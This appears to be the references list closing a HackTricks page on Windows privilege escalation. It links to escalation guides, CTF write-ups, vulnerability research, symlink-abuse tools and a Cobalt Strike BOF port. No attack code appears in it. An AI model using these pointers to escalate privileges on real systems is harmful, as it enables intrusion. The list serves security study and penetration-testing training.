- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

{{#include ../../banners/hacktricks-training.md}}
